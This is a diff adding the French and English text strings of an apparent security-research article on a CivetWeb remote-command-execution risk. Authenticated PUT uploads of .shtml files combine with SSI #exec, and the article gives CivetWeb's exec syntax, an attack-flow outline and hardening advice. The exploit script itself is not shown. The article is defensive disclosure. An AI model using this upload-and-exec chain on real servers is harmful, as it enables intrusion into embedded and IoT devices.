+                s5_h2: "05 - Analyse du code source : les deux points de jonction",
+                s5_h3_1: "Point 1 : le dispatching SSI dans la pipeline de service de fichiers",
+                s5_p1: "Après résolution de l'URI en chemin de fichier et vérification des droits de lecture, CivetWeb teste systématiquement si le chemin correspond au pattern SSI <strong>avant</strong> de décider comment servir le fichier. Ce test est présent à trois endroits du code : ligne 7802 (sélection de l'index), ligne 12772 (traitement des includes SSI) et ligne 15825 (dispatch principal).",
+                s5_lbl_1: "- Dispatch principal : GET sur un .shtml",
+                s5_h3_2: "Point 2 : l'absence totale de filtre extension dans la chaîne d'autorisation PUT",
+                s5_p2: "La chaîne de traitement d'une requête PUT passe par <code>is_authorized_for_put()</code> (vérification des identifiants digest), puis directement dans <code>put_file()</code> sans jamais tester l'extension du fichier cible. Il n'existe pas de liste noire d'extensions dangereuses, pas de configuration de type \"allow_extensions\", et aucun avertissement dans le processus de validation.",
+                /* S6 */
+                s6_h2: "06 - Chemin de données complet",
+                s6_lbl_1: "Attack_Flow // CivetWeb PUT+SSI RCE",
+                /* S7 */
+                s7_h2: "07 - Démonstration live (PoC)",
+                s7_p1: "La démonstration a été conduite en conditions réelles sur deux environnements : un binaire compilé avec MSVC sous <strong>Windows 11</strong> et un binaire compilé avec GCC sous <strong>Linux</strong>. Dans les deux cas, CivetWeb a été configuré avec <code>put_delete_auth_file</code> pointant vers un fichier de mots de passe digest standard, et <code>ssi_pattern</code> laissé à sa valeur par défaut.",
+                s7_h3_1: "Configuration du serveur de test",
+                s7_lbl_1: "- Préparation de l'environnement de test",
+                s7_h3_2: "Script PoC",
+                s7_lbl_2: "- Exploit Python (digest auth + PUT + GET)",
+                s7_h3_3: "Résultat observé",
+                s7_lbl_3: "terminal // demo live",
+                s7_b_t: "Portée de l'exécution",
+                s7_b_p: "Les commandes s'exécutent avec les droits du processus CivetWeb, typiquement le compte qui a lancé le serveur (souvent root dans les systèmes embarqués ou les appareils IoT). Sur Linux, <code>popen()</code> invoque <code>/bin/sh -c \"commande\"</code> : toutes les fonctionnalités du shell sont disponibles (pipes, redirection, variables d'environnement, appels système). Sur Windows, CivetWeb redéfinit <code>popen()</code> en <code>_popen()</code> qui appelle <code>cmd.exe</code> : mêmes capacités d'exécution.",
+                /* S8 */
+                s8_h2: "08 - Pourquoi ce n'est pas un CVE civetweb",
+                s8_p1: "Certains lecteurs pourraient s'attendre à voir un numéro CVE dans cet article. Il n'y en a pas, et ce n'est pas un oubli. Voici la distinction importante : <strong>un CVE qualifie un défaut dans le code</strong> (logique cassée, dépassement de tampon, contournement de sécurité). Ici, le code fait exactement ce qu'il est documenté pour faire, sans aucune erreur de logique interne.",
+                th_context: "Contexte", th_verdict: "Verdict", th_reason: "Raison",
+                s8_td1: "CVE contre CivetWeb", s8_td1_v: "<span class=\"bdg b\">Non</span>", s8_td1_r: "Comportement documenté et intentionnel, identique à Apache mod_include depuis 1995.",
+                s8_td2: "Finding pentest sur un déploiement", s8_td2_v: "<span class=\"bdg r\">Oui</span>", s8_td2_r: "\"Unrestricted file upload leading to RCE via SSI injection\" est un finding reconnu, classé OWASP, rapporté en audit professionnel.",
+                s8_td3: "Recommandation de hardening pour CivetWeb", s8_td3_v: "<span class=\"bdg a\">Oui, légitime</span>", s8_td3_r: "La documentation devrait avertir explicitement, comme Apache le fait dans son propre UserManual depuis des décennies.",
+                s8_p2: "Le précédent est établi depuis longtemps. La documentation officielle d'Apache <code>mod_include</code> dit explicitement : <em>\"It is recommended that you do not enable exec for any directory where users other than the system administrator can write.\"</em> CivetWeb, lui, n'émet aucun avertissement équivalent dans la documentation de <code>ssi_pattern</code> ni dans celle de <code>put_delete_auth_file</code>. C'est l'angle mort concret : deux pages de documentation qui décrivent deux options indépendantes, sans jamais mentionner leur interaction explosive.",
+                /* S9 */
+                s9_h2: "09 - Recommandations",
+                s9_h3_1: "Pour les administrateurs et intégrateurs",
+                s9_st1_t: "Désactiver ssi_pattern si PUT est actif",
+                s9_st1_d: "Dans votre configuration CivetWeb, ajouter <code>ssi_pattern=\"\"</code> (valeur vide) si <code>put_delete_auth_file</code> est configuré. C'est la correction la plus directe et la plus sûre. Le templating SSI n'est presque jamais nécessaire dans les usages IoT ou embarqués typiques.",
+                s9_st2_t: "Séparer les docroots upload et contenu servi",
+                s9_st2_d: "Si le PUT doit coexister avec le SSI : placer les fichiers autorisés en upload dans un sous-répertoire dédié (<code>/uploads/</code>) et configurer <code>ssi_pattern</code> pour ne jamais matcher ce répertoire (ex : <code>\"**.shtml$\"</code> remplacé par <code>\"/static/**.shtml$\"</code> en chemin absolu).",
+                s9_st3_t: "Appliquer le principe du moindre privilège sur les comptes PUT",
+                s9_st3_d: "Traiter tout compte autorisé dans <code>put_delete_auth_file</code> avec le même niveau de confiance qu'un accès shell. Ne pas distribuer ces identifiants comme des \"mots de passe d'upload bénins\" : ils donnent accès à la surface d'exécution complète du serveur si SSI est actif.",
+                s9_st4_t: "Lancer le processus serveur avec le minimum de droits",
+                s9_st4_d: "Sur Linux, créer un utilisateur dédié sans shell (<code>useradd -r -s /sbin/nologin civetweb</code>) et lancer le serveur sous cet utilisateur. Sur les systèmes embarqués sans gestion utilisateur, sandboxer le processus via <code>seccomp</code>, <code>chroot</code> ou namespaces Linux pour limiter la portée des commandes exécutées via SSI.",
+                s9_st5_t: "Auditer les déploiements existants",
+                s9_st5_d: "Vérifier la configuration de tout serveur CivetWeb en production : <code>grep -i \"put_delete_auth_file\\|ssi_pattern\" civetweb.conf</code>. Si les deux options sont présentes simultanément, l'exposition au RCE est immédiate pour tout détenteur des identifiants PUT.",
+                s9_h3_2: "Pour le projet CivetWeb",
+                s9_st6_t: "Ajouter un avertissement dans la documentation",
+                s9_st6_d: "Dans <code>docs/UserManual.md</code>, section <code>ssi_pattern</code> : avertir explicitement que <code>#exec</code> est équivalent à un accès shell et ne doit jamais être actif dans des répertoires où des utilisateurs peuvent déposer des fichiers via PUT ou tout autre mécanisme d'upload. Modéliser sur l'avertissement présent dans la documentation officielle Apache mod_include.",
+                s9_st7_t: "Envisager une option ssi_exec séparée",
+                s9_st7_d: "Séparer le pattern SSI en deux options distinctes : <code>ssi_pattern</code> (pour <code>#include</code>) et <code>ssi_exec_pattern</code> (pour <code>#exec</code>), cette dernière étant désactivée par défaut. Les deux fonctionnalités ne posent pas le même risque et ne devraient pas partager le même interrupteur.",
+                /* S10 */
+                s10_h2: "10 - Références",
+                s10_li1: "CivetWeb, <em>UserManual.md, section ssi_pattern</em> : <a href=\"https://github.com/civetweb/civetweb/blob/master/docs/UserManual.md\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">github.com/civetweb/civetweb</a>",
+                s10_li2: "CivetWeb, <em>docs/api/mg_start.md, option put_delete_auth_file</em> : <a href=\"https://github.com/civetweb/civetweb/blob/master/docs/api/mg_start.md\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">github.com/civetweb/civetweb</a>",
+                s10_li3: "Apache HTTP Server, <em>mod_include documentation : security warning on exec</em> : <a href=\"https://httpd.apache.org/docs/current/mod/mod_include.html\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">httpd.apache.org</a>",
+                s10_li4: "OWASP, <em>Server-Side Includes (SSI) Injection</em> : <a href=\"https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">owasp.org</a>",
+                s10_li5: "OWASP, <em>Unrestricted File Upload</em> (CWE-434) : <a href=\"https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">owasp.org</a>",
+                s10_li6: "CivetWeb GitHub, commit <em>588860e3 \"Refactor request handling\"</em> : <a href=\"https://github.com/civetweb/civetweb/commit/588860e3\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">github.com/civetweb/civetweb</a>",
+                s10_b_t: "Conclusion",
+                s10_b_p: "La leçon de cet audit n'est pas \"CivetWeb est vulnérable\" mais \"deux fonctionnalités chacune raisonnable peuvent produire ensemble un résultat qu'aucune des deux ne devrait produire seule\". C'est une classe de problème de sécurité dont la détection nécessite une analyse multi-options plutôt qu'une simple lecture de code ligne par ligne. Les administrateurs doivent traiter <code>ssi_pattern</code> et <code>put_delete_auth_file</code> comme des options mutuellement exclusives jusqu'à ce que la documentation et l'implémentation CivetWeb introduisent des gardes appropriées.",
+                /* footer / misc */
+                news_title: "Recevoir nos recherches (0-Spam)",
+                news_desc: "Inscrivez-vous à notre flux de transmission sécurisé. Uniquement des writeups techniques, des annonces de CTF et des rapports d'audit publics.",
+                news_btn: "S'abonner_",
+                footer_bio: "Unité de recherche en vulnérabilités avancées et audit de systèmes critiques.",
+                f_link_audit: "Audit de Code Source", f_link_ics: "Systèmes Industriels",
+                f_link_tools: "Outils Open Source",
+                footer_pgp: "Pour toute communication sensible, privilégiez le chiffrement PGP.",
+                btn_copy: "<i class=\"far fa-copy\"></i> COPIER"
+            },
+            en: {
+                /* nav / header */
+                nav_services: "Services", nav_research: "Research", nav_blog: "Blog",
+                nav_events: "Events", nav_contact: "Contact Us",
+                art_back: "<i class=\"fas fa-arrow-left group-hover:-translate-x-2 transition-transform\"></i> Back_Archives",
+                tag_sec: "Web Security", tag_research: "Research", tag_rce: "RCE · Live Demo",
+                art_title: "CivetWeb :<br><span class=\"text-gray-300\">PUT + SSI</span><br>= RCE.",
+                art_subtitle: "How two fully legitimate and documented CivetWeb features silently combine to produce arbitrary remote command execution. Source code analysis, live demonstration, and hardening recommendations.",
+                art_level: "Level: intermediate", art_read_time: "Read: 15 min",
+                art_tag: "CivetWeb 1.17 · <strong style=\"color:#b45309\">Medium (auth required)</strong>",
+                art_author_role: "Lead Vulnerability Researcher",
+                /* TOC */
+                toc_title: "Table of contents",
+                toc_1: "<strong>01.</strong> Executive summary",
+                toc_2: "<strong>02.</strong> Context: CivetWeb",
+                toc_3: "<strong>03.</strong> Block 1: Authenticated PUT",
+                toc_4: "<strong>04.</strong> Block 2: SSI #exec on by default",
+                toc_5: "<strong>05.</strong> Source code analysis",
+                toc_6: "<strong>06.</strong> Complete data flow",
+                toc_7: "<strong>07.</strong> Live demonstration (PoC)",
+                toc_8: "<strong>08.</strong> Why this is not a CVE",
+                toc_9: "<strong>09.</strong> Recommendations",
+                toc_10: "<strong>10.</strong> References",
+                /* S1 */
+                s1_h2: "01 - Executive Summary",
+                s1_p1: "<strong>CivetWeb</strong> is a widely used open-source embedded HTTP server found in IoT systems, industrial equipment, and C/C++ applications requiring a built-in web server. Its single-file design (<code>civetweb.c</code>, approximately 23,000 lines) makes it attractive for embedded use, but also concentrates a large code surface into a single component.",
+                s1_p2: "During a full code audit of version <strong>1.17</strong> (master branch, commit <code>588860e3</code>), we identified a combination of two fully legitimate and documented features that, once activated together, allow any user with PUT credentials to execute arbitrary commands on the server. This is not a bug in the code, but an undocumented interaction between two configuration options.",
+                s1_b_t: "Real impact on deployments",
+                s1_b_p: "Any CivetWeb deployment with <code>put_delete_auth_file</code> enabled (remote PUT with authentication) is exposed to full RCE for any account authorized for PUT, including \"upload-only\" accounts considered non-privileged. With SSI <code>#exec</code> active by default for <code>*.shtml</code> and <code>*.shtm</code>, no additional configuration is required on the attacker's side.",
+                th_attr: "Attribute", th_val: "Value",
+                s1_td1: "Software",
+                s1_td2: "Type", s1_td2_v: "Feature combination: File Upload + SSI Exec (CWE-434 + CWE-1188)",
+                s1_td3: "Requirements", s1_td3_v: "<code>put_delete_auth_file</code> configured + valid PUT credentials",
+                s1_td4: "Impact", s1_td4_v: "RCE with server process privileges",
+                s1_td5: "Vector", s1_td5_v: "Network (HTTP PUT + HTTP GET)",
+                s1_td6: "Severity (CVSS-like)", s1_td6_v: "<span class=\"bdg a\">Medium (6.8) if auth</span>",
+                s1_td7: "CVE assigned", s1_td7_v: "<span class=\"bdg b\">No (documented behavior)</span>",
+                s1_td8: "Recommended fix", s1_td8_v: "Disable <code>ssi_pattern</code> if PUT is active, or separate docroots",
+                /* S2 */
+                s2_h2: "02 - Context: CivetWeb",
+                s2_h3_1: "What is CivetWeb?",
+                s2_p1: "CivetWeb is a fork of Mongoose (before its commercial split), maintained as an open-source project. It is designed to be embedded directly into a C/C++ application by including a single source file. It is commonly found in web interfaces of network equipment, IoT administration consoles, embedded industrial software, and local development tools.",
+                s2_p2: "Its configuration model relies on key/value pairs passed at server startup, either through a configuration file or command-line arguments. Two of these options are at the core of our analysis: <code>put_delete_auth_file</code>, which enables the HTTP PUT method to write files to the server, and <code>ssi_pattern</code>, which defines the file extensions interpreted as SSI (Server Side Includes) pages.",
+                s2_lbl_1: "- Default configuration of the two key options",
+                s2_b_t: "Implicit trust model",
+                s2_b_p: "The documentation for <code>put_delete_auth_file</code> describes this option as enabling \"writing files to the server via PUT\". The documentation for <code>ssi_pattern</code> describes SSI as a \"simple server templating language\". Neither documentation page mentions that combining them is equivalent to granting shell access to every PUT account.",
+                /* S3 */
+                s3_h2: "03 - Block 1: Authenticated PUT with no extension restriction",
+                s3_p1: "When an administrator configures <code>put_delete_auth_file</code> to point to a digest password file, CivetWeb accepts authenticated HTTP PUT requests and writes their body directly to disk in the <code>document_root</code>. The function handling this write is <code>put_file()</code> at line 12500 of <code>civetweb.c</code>.",
+                s3_lbl_1: "- put_file(): no extension restriction",
+                s3_p2: "The upstream authorization check (<code>is_authorized_for_put()</code>) only confirms that the user knows the credentials from <code>put_delete_auth_file</code>. It asks no question about the extension or content of the file the user wants to upload. A PUT account is strictly equivalent, in terms of actual capability, to full FTP access to the <code>document_root</code>.",
+                /* S4 */
+                s4_h2: "04 - Block 2: SSI #exec active by default",
+                s4_p1: "Server Side Includes (SSI) are a 1990s server templating technology allowing dynamic content to be included in an HTML page without a full scripting language. CivetWeb supports two SSI directives: <code>include</code> (inclusion of another file) and <code>exec</code> (execution of a shell command whose standard output is included in the response).",
+                s4_p2: "The extension/SSI-interpretation match is verified by <code>match_prefix_strlen()</code> against the value of <code>ssi_pattern</code> before each file is served. The default value <code>\"**.shtml$|**.shtm$\"</code> applies to all files under any subdirectory of the <code>document_root</code> whose name ends with <code>.shtml</code> or <code>.shtm</code>. No separate option exists to disable only <code>#exec</code> while keeping <code>#include</code> active.",
+                s4_lbl_1: "- do_ssi_exec(): popen() without filtering",
+                s4_b_t: "CivetWeb-specific SSI syntax",
+                s4_b_p: "Note: the <code>#exec</code> syntax in CivetWeb is <strong>different</strong> from classic Apache syntax. CivetWeb expects <code>&lt;!--#exec \"command\"--&gt;</code> (without <code>cmd=</code>), unlike <code>&lt;!--#exec cmd=\"command\"--&gt;</code> used by Apache mod_include. The internal <code>sscanf</code> parses the first quote immediately after the directive name.",
+                /* S5 */
+                s5_h2: "05 - Source code analysis: the two junction points",
+                s5_h3_1: "Point 1: SSI dispatching in the file serving pipeline",
+                s5_p1: "After resolving the URI to a file path and checking read permissions, CivetWeb systematically tests whether the path matches the SSI pattern <strong>before</strong> deciding how to serve the file. This check appears at three points in the code: line 7802 (index selection), line 12772 (SSI include processing), and line 15825 (main dispatch).",
+                s5_lbl_1: "- Main dispatch: GET on a .shtml file",
+                s5_h3_2: "Point 2: total absence of extension filtering in the PUT authorization chain",
+                s5_p2: "The PUT request processing chain goes through <code>is_authorized_for_put()</code> (digest credential check), then directly into <code>put_file()</code> without ever testing the target file's extension. There is no blacklist of dangerous extensions, no \"allow_extensions\" configuration, and no warning in the validation process.",
+                /* S6 */
+                s6_h2: "06 - Complete data flow",
+                s6_lbl_1: "Attack_Flow // CivetWeb PUT+SSI RCE",
+                /* S7 */
+                s7_h2: "07 - Live demonstration (PoC)",
+                s7_p1: "The demonstration was conducted in real conditions on two environments: a binary compiled with MSVC on <strong>Windows 11</strong> and a binary compiled with GCC on <strong>Linux</strong>. In both cases, CivetWeb was configured with <code>put_delete_auth_file</code> pointing to a standard digest password file, and <code>ssi_pattern</code> left at its default value.",
+                s7_h3_1: "Test server configuration",
+                s7_lbl_1: "- Test environment setup",
+                s7_h3_2: "PoC script",
+                s7_lbl_2: "- Python exploit (digest auth + PUT + GET)",
+                s7_h3_3: "Observed result",
+                s7_lbl_3: "terminal // live demo",
+                s7_b_t: "Scope of execution",
+                s7_b_p: "Commands execute with the CivetWeb process privileges, typically the account that started the server (often root in embedded systems or IoT devices). On Linux, <code>popen()</code> invokes <code>/bin/sh -c \"command\"</code>: all shell features are available (pipes, redirection, environment variables, system calls). On Windows, CivetWeb redefines <code>popen()</code> to <code>_popen()</code> which calls <code>cmd.exe</code>: same execution capabilities.",
+                /* S8 */
+                s8_h2: "08 - Why this is not a CVE",
+                s8_p1: "Some readers might expect to see a CVE number in this article. There isn't one, and it's not an oversight. Here is the key distinction: <strong>a CVE qualifies a defect in the code</strong> (broken logic, buffer overflow, security bypass). Here, the code does exactly what it is documented to do, with no internal logic error.",
+                th_context: "Context", th_verdict: "Verdict", th_reason: "Reason",
+                s8_td1: "CVE against CivetWeb", s8_td1_v: "<span class=\"bdg b\">No</span>", s8_td1_r: "Documented and intentional behavior, identical to Apache mod_include since 1995.",
+                s8_td2: "Pentest finding on a deployment", s8_td2_v: "<span class=\"bdg r\">Yes</span>", s8_td2_r: "\"Unrestricted file upload leading to RCE via SSI injection\" is a recognized OWASP-classified finding reported in professional audits.",
+                s8_td3: "Hardening recommendation for CivetWeb", s8_td3_v: "<span class=\"bdg a\">Yes, legitimate</span>", s8_td3_r: "Documentation should explicitly warn, as Apache has done in its own UserManual for decades.",
+                s8_p2: "The precedent has long been established. The official Apache <code>mod_include</code> documentation explicitly states: <em>\"It is recommended that you do not enable exec for any directory where users other than the system administrator can write.\"</em> CivetWeb emits no equivalent warning in the documentation for <code>ssi_pattern</code> or <code>put_delete_auth_file</code>. This is the concrete blind spot: two documentation pages describing two independent options, never mentioning their explosive interaction.",
+                /* S9 */
+                s9_h2: "09 - Recommendations",
+                s9_h3_1: "For administrators and integrators",
+                s9_st1_t: "Disable ssi_pattern if PUT is active",
+                s9_st1_d: "In your CivetWeb configuration, add <code>ssi_pattern=\"\"</code> (empty value) if <code>put_delete_auth_file</code> is configured. This is the most direct and safest fix. SSI templating is almost never needed in typical IoT or embedded use cases.",
+                s9_st2_t: "Separate upload and served content docroots",
+                s9_st2_d: "If PUT must coexist with SSI: place authorized upload files in a dedicated subdirectory (<code>/uploads/</code>) and configure <code>ssi_pattern</code> to never match that directory (e.g., replace <code>\"**.shtml$\"</code> with <code>\"/static/**.shtml$\"</code> as an absolute path).",
+                s9_st3_t: "Apply least privilege to PUT accounts",
+                s9_st3_d: "Treat any account authorized in <code>put_delete_auth_file</code> with the same level of trust as shell access. Do not distribute these credentials as \"benign upload passwords\": they grant access to the server's full execution surface if SSI is active.",
+                s9_st4_t: "Run the server process with minimal privileges",
+                s9_st4_d: "On Linux, create a dedicated shell-less user (<code>useradd -r -s /sbin/nologin civetweb</code>) and run the server under that account. On embedded systems without user management, sandbox the process via <code>seccomp</code>, <code>chroot</code>, or Linux namespaces to limit the scope of commands executed via SSI.",
+                s9_st5_t: "Audit existing deployments",
+                s9_st5_d: "Check the configuration of any CivetWeb server in production: <code>grep -i \"put_delete_auth_file\\|ssi_pattern\" civetweb.conf</code>. If both options are present simultaneously, RCE exposure is immediate for any holder of PUT credentials.",
+                s9_h3_2: "For the CivetWeb project",
+                s9_st6_t: "Add a warning to the documentation",
+                s9_st6_d: "In <code>docs/UserManual.md</code>, section <code>ssi_pattern</code>: explicitly warn that <code>#exec</code> is equivalent to shell access and must never be active in directories where users can upload files via PUT or any other upload mechanism. Model it on the warning in the official Apache mod_include documentation.",
+                s9_st7_t: "Consider a separate ssi_exec option",
+                s9_st7_d: "Split the SSI pattern into two distinct options: <code>ssi_pattern</code> (for <code>#include</code>) and <code>ssi_exec_pattern</code> (for <code>#exec</code>), the latter disabled by default. The two features do not carry the same risk and should not share the same switch.",
+                /* S10 */
+                s10_h2: "10 - References",
+                s10_li1: "CivetWeb, <em>UserManual.md, ssi_pattern section</em>: <a href=\"https://github.com/civetweb/civetweb/blob/master/docs/UserManual.md\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">github.com/civetweb/civetweb</a>",
+                s10_li2: "CivetWeb, <em>docs/api/mg_start.md, put_delete_auth_file option</em>: <a href=\"https://github.com/civetweb/civetweb/blob/master/docs/api/mg_start.md\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">github.com/civetweb/civetweb</a>",
+                s10_li3: "Apache HTTP Server, <em>mod_include documentation: security warning on exec</em>: <a href=\"https://httpd.apache.org/docs/current/mod/mod_include.html\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">httpd.apache.org</a>",
+                s10_li4: "OWASP, <em>Server-Side Includes (SSI) Injection</em>: <a href=\"https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">owasp.org</a>",
+                s10_li5: "OWASP, <em>Unrestricted File Upload</em> (CWE-434): <a href=\"https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">owasp.org</a>",
+                s10_li6: "CivetWeb GitHub, commit <em>588860e3 \"Refactor request handling\"</em>: <a href=\"https://github.com/civetweb/civetweb/commit/588860e3\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">github.com/civetweb/civetweb</a>",
+                s10_b_t: "Conclusion",
+                s10_b_p: "The lesson from this audit is not \"CivetWeb is vulnerable\" but \"two individually reasonable features can together produce a result that neither should produce alone\". This is a class of security problem whose detection requires multi-option analysis rather than simple line-by-line code reading. Administrators should treat <code>ssi_pattern</code> and <code>put_delete_auth_file</code> as mutually exclusive options until CivetWeb's documentation and implementation introduce appropriate guards.",
+                /* footer / misc */
+                news_title: "Receive our research (0-Spam)",
+                news_desc: "Subscribe to our secure transmission feed. Strictly technical writeups, CTF announcements, and public audit reports.",
+                news_btn: "Subscribe_",
+                footer_bio: "Advanced vulnerability research unit and critical systems auditing.",
+                f_link_audit: "Source Code Audit", f_link_ics: "Industrial Systems",
+                f_link_tools: "Open Source Tools",
+                footer_pgp: "For all sensitive communication, please use PGP encryption.",
+                btn_copy: "<i class=\"far fa-copy\"></i> COPY"
+            }
+        };
+
+    </script>
+    <script src="../static/main.js"></script>
+</body>
+</html>
